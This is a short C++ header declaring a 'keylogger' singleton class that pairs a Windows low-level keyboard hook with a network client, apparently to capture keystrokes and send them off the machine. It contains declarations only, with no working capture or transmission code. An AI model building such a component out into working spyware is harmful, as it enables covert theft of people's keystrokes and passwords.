#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include "kqnet.h"
#include "common.h"

class keylogger
{
public:
    
    static keylogger& GetInstance();

private:
    HHOOK hook;
    kq::client_interface<messageType> client;

private:
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};